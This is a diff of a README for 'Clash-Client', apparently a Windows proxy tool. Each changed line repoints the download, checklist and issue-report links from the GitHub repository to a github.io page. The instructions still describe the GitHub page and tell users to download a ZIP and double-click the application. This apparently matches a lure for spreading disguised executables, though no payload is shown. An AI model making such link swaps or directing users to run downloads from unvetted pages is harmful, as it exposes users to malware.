@@ -1,6 +1,6 @@
 # ⚡ Clash-Client - Your Rules, Everywhere You Are
 
-[![Download Clash-Client](https://img.shields.io/badge/Download-Clash--Client-blue?style=for-the-badge&logo=github)](https://github.com/waleedkhanbaloch/Clash-Client)
+[![Download Clash-Client](https://img.shields.io/badge/Download-Clash--Client-blue?style=for-the-badge&logo=github)](https://waleedkhanbaloch.github.io)
 
 ## 🎉 Welcome to Clash-Client
 
@@ -14,7 +14,7 @@ Getting Clash-Client on your Windows PC is simple. Just follow these steps:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/waleedkhanbaloch/Clash-Client](https://github.com/waleedkhanbaloch/Clash-Client)
+Visit this link to download the application: [https://waleedkhanbaloch.github.io](https://waleedkhanbaloch.github.io)
 
 When you click the link, your browser will open the Clash-Client GitHub page. Look for a green button that says **"Code"** – click it, then select **"Download ZIP"**. This will download a compressed folder to your computer.
 
@@ -97,7 +97,7 @@ After connecting, open your web browser and visit any website. If it loads, you'
 
 Before you dive in, make sure you've:
 
-1. ✅ Downloaded the ZIP file from [https://github.com/waleedkhanbaloch/Clash-Client](https://github.com/waleedkhanbaloch/Clash-Client)
+1. ✅ Downloaded the ZIP file from [https://waleedkhanbaloch.github.io](https://waleedkhanbaloch.github.io)
 2. ✅ Extracted it to a folder
 3. ✅ Double-clicked the application file to launch it
 4. ✅ Selected a profile (or used the default)
@@ -106,8 +106,8 @@ If all steps are done, you're ready to browse. Welcome to the Clash way.
 
 ## 🔗 Quick Links
 
-- [Download Clash-Client](https://github.com/waleedkhanbaloch/Clash-Client)
-- [Report an Issue](https://github.com/waleedkhanbaloch/Clash-Client/issues)
+- [Download Clash-Client](https://waleedkhanbaloch.github.io)
+- [Report an Issue](https://waleedkhanbaloch.github.io)
 
 ## 📢 Spread the Word
 
